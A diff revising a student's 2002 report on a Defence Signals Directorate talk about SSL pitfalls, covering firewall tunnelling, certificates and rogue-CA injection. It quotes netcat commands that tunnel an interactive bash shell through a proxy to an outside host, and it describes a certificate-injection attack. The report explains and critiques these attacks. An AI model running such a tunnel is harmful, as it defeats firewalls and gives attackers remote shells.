@@ -1,126 +1,180 @@
 <!DOCTYPE article PUBLIC "-//OASIS//DTD DocBook V4.1//EN">
 <article>
 <title>Secure Sockets Layer: Pitfalls and Risks</title>
-   <subtitle>A final year project discussion paper (number three)</subtitle>
 
-<sect1>
-<title>About the author</title>
-<para>
-Michael's student number is 964076. He can be contacted at mikal@stillhq.com. Copyright (c) Michael Still 2002. This submission is
-    390
-words, not including the code snippets.
-</para>
-</sect1>
+<articleinfo>
+<author>
+  <firstname>Michael</firstname>
+  <surname>Still</surname>
+  <affiliation>
+    <jobtitle>964076</jobtitle>
+  </affiliation>
+</author>
+</articleinfo>
 
 <sect1>
 <title>Abstract</title>
 <para>
-This talk discussed some of Defense Signals Directorate's (DSD) concerns regarding the security of the Secure Sockets Layer (SSL) infrastructure deployed by almost all Internet users. It discussed the theory of proxying SSL, and the insecurities this causes. It then demonstrated a variety of symantec attacks against SSL users based on the injection of deceptive certificates into the Operating System certificate store.
+This talk discussed some of Defense Signals Directorate's (DSD) concerns regarding the security of the Secure Sockets Layer (SSL) infrastructure deployed by almost all Internet users. It discussed the theory of proxying SSL, and the insecurities this causes. It then demonstrated a variety of semantic attacks against SSL users based on the injection of deceptive certificates into the Operating System certificate store.
 </para>
 </sect1>
 
 <sect1><title>The meeting</title>
 <para>
-This meeting was held at the Australian Federal Police College, in Barton, ACT on 16 July 2002, between 5:30pm and 7:30pm. The speakers were Steven McLeod and Dr Michael Cohen from DSD.
+This meeting was held at the Australian Federal Police College, in Barton, ACT on 16 July 2002, between 5:30pm and 7:30pm. The speakers were Steven McLeod and Dr Michael Cohen from DSD. The meeting was organized by the Canberra Division of the Institution of Engineers Australia.
 </para>
 </sect1>
 
-<sect1><title>Main issue is the trust mechanism</title>
+<sect1><title>What is SSL?</title>
 <para>
- - Normal port is 443
+SSL is the Secure Sockets Layer, an allegedly secure transport medium for network traffic that normally communicates on Port 443. The SSL layer acts as a transport for other network protocols, with the most common users being the Hyper Text Transport Protocol (HTTP, spoken by web servers), File Transfer Protocol (FTP), and telnet.
+</para>
+
+<para>
+It should be noted in the telnet case that this is a different solution than that offered by Secure Shell (SSH).
 </para>
 </sect1>
 
-<sect1><title>SSL was designed to solve two problems</title>
+<sect1><title>Design goals of SSL</title>
 <para>
- - intercept of data
- - proof of identity of the communicating parties
+The speakers stated that SSL has two design goals:
 </para>
+
+<orderedlist>
+<listitem><para>Stop the intercept of data</para></listitem>
+<listitem><para>Provide proof of identity of the communicating parties</para></listitem>
+</orderedlist>
+
+<para>
+This statement is backed by the SSL specification:
+</para>
+
+<para>
+<quote>The primary goal of the SSL Protocol is to provide privacy and reliability between two communicating applications.</quote> -- http://wp.netscape.com/eng/ssl3/draft302.txt
+</para>
+
+<para>
+The designers of the SSL protocol sought to achieve this outcome via the use of several techniques:
+</para>
+
+<orderedlist>
+<listitem><para>The use of public key cryptography to authenticate the communicating endpoints. This is based on Public Key Infrastructure techniques that require each endpoint to trust a common certifying authority.</para></listitem>
+<listitem><para>The use of end to end cryptography, once trust has been established.</para></listitem>
+</orderedlist>
 </sect1> 
 
-<sect1><title>Threats</title>
+<sect1><title>Management threats</title>
 <para>
- - SSL is encrypted
- - Man in the middle should not be able to view traffic
-  - Therefore no: firewalling, ids, virus scan, auditing
+It became clear during the talk that the area of Defense Signals Directorate responsible for the talk is a network management section. The main objection to SSL raised during the talk was that because SSL is encrypted, men in the middle are not able to view the traffic passing through the network. The Defense Signals Directorate speakers viewed this as a flaw because it stopped them from carrying out standard network management in the form of:
+</para>
+
+<orderedlist>
+<listitem><para>Firewalling</para></listitem>
+<listitem><para>Intrusion detection</para></listitem>
+<listitem><para>Virus scanning</para></listitem>
+<listitem><para>Auditing</para></listitem>
+<listitem><para>Policy based routing</para></listitem>
+</orderedlist>
+
+<para>
+It should be noted that the encryption of data transfers is the main strength of SSL, and therefore the inability to carry out these tasks needs to be seen in the greater context of the additional security it provides for on line communication.
 </para>
 </sect1>
 
-<sect1><title>Normally</title>
+<sect1><title>Firewalling SSL</title>
 <para>
- - Client requests connect to server (CONNECT ... HTTP/1.1)
- - Firewall builds a tunnel
- - Client and server talk 
+The normal mode of firewalling SSL is for the client to connect to the firewall machine, the firewall then builds a <quote>tunnel</quote> for the connection, and then the client and server talk. The firewall has no access to the traffic through the tunnel once it is established, because that traffic is encrypted.
 </para>
 </sect1>
 
-<sect1><title>Dangerous</title>
+<sect1><title>The dangers of this technique</title>
 <para>
- - Run on outside machine: nc -l -p 443
+The speakers presented an example of why this tunneling technique is dangerous. This example is presented verbatim.
+</para>
+
+<para>
+The following is run on the outside machine.
+</para>
+
+<programlisting>
+nc -l -p 443
 
 #!/bin/bash
 echo -e "CONNECT outside.machine.foo.com:443 HTTP/1.0\r\n\r\n"
 bash -i 2> /dev/null
+</programlisting>
 
- - On inside machine: nc -e scriptfile.sh proxyhost 8080
+<para>
+On the inside machine, the following command is run:
+</para>
 
- - There are windows apps to do this too (HTTPort)
+<programlisting>
+nc -e scriptfile.sh proxyhost 8080
+</programlisting>
+
+<para>
+This example sets up a listening server on the outside, which takes an arbitrary connection on the SSL port. The traffic from the inside machine is simply pushed through to the outside machine.
+</para>
+
+<para>
+Effectively, this has created a tunnel through the firewall that a user can then push <command>any</command> traffic through. This has the net effect of making the firewall completely ineffective, as it can be totally defeated.
+</para>
+
+<para>
+The most important factor here is that there are applications, especially for Microsoft Windows, that do all of this for the user, which makes it available to many more users.
 </para>
 </sect1>
 
-<sect1><title>WebDav</title>
+<sect1><title>Digital certificates</title>
 <para>
- - Web Distributed Authoring and Versioning
- - File management over HTTP
- - Upload arbitary files
- - Download arbitary files
+A digital certificate is a digital statement collating a number of fields:
+</para>
 
- - Well supported on Windows especially
- - Most good web servers support it
+<itemizedlist>
+<listitem><para>Company name</para></listitem>
+<listitem><para>Server name</para></listitem>
+<listitem><para>Email address</para></listitem>
+<listitem><para>Public key</para></listitem>
+</itemizedlist>
+
+<para>
+It is public key signed by the certifying authority, which must be trusted by both parties.
+</para>
+
+<para>
+Therefore, in order for this process to be effective and secure, the certifying authority must perform identity checks on those requesting certificates. The trust decision regarding the certifying authority is normally made by the vendor of the web browser in question, and the browsers ship with a default set of trusted certifying authorities. However, it is possible for users to explicitly create a trust relationship for a new certifying authority if they desire.
 </para>
 </sect1>
 
-<sect1><title>Certificates</title>
+<sect1><title>Attacking this trust relationship</title>
 <para>
- - A digital statement collating a number of fields
- - Company name, server name, email address, public key
- - Signed by the certifying authority
+There were a number of methods for attacking this trust relationship discussed by the speakers. They were:
 </para>
-</sect1>
 
-<sect1><title>Therefore</title>
+<sect2><title>Certificate security</title>
 <para>
- - CA needs to perform identity checks
- - Cert can't be changed
- - Anyone can verify certificate
- - The decision of trust in a browser is made about whether the browser trusts the CA
+Many of the web servers have very poor security over the server side certificates. For example, Apache, an open source web server, uses a hard coded pass phrase (stored in a configuration file), to access the encrypted private key. If an attacker has access to this configuration file (which is not an unlikely scenario), then the certificate can be compromised.
 </para>
-</sect1>
 
-<sect1><title>Securing the server's private key</title>
 <para>
- - Apache uses a pass phrase to encrypt the private key
- - IIS doesn't bother!
+Microsoft's IIS web server doesn't even bother to encrypt the certificate, so if an attacker can gain access to the server's hard disc, then the certificate is compromised.
 </para>
-</sect1>
+</sect2>
 
-<sect1><title>Attacks</title>
+<sect2><title>An example client attack: the applet vulnerability in Microsoft Internet Explorer</title>
 <para>
- - Man in the middle -- certificate stops this (or does it)
+The speakers also demonstrated a sample attack on the client side. This involved having a Microsoft Internet Explorer user access a web page with attached Visual Basic Script. This script inserted a new certifying authority certificate into the machine's configuration registry using a well known vulnerability. Because the certificate specifies the name of the certifying authority, this name can be deceptively similar to the name of a real certifying authority.
 </para>
-</sect1>
 
-<sect1><title>APPLET vulnerability in MSIE</title>
 <para>
-
-http://www.dsd.gov.au/papers/AusCert2002.pdf
-                      talks     c
+The user then attempts to contact a web site using SSL, for instance their Internet banking. The attacker can insert their own pages instead of the real bank's pages, and because the new pages are signed by a <quote>trusted</quote> certifying authority, the user is assured that the connection is secure and safe.
 </para>
+</sect2>
 </sect1>
 
 <sect1><title>Response to the talk</title>
 <para>
-
+The talk was well researched and presented. However, I did not agree with all of the assertions made by the speakers -- for instance they stated that SSL has no place in a work environment because it is not possible for the network administrator to monitor it. To me, this seems to be the entire purpose of SSL, and is therefore not a convincing argument.
 </para>
 </sect1>
 </article>
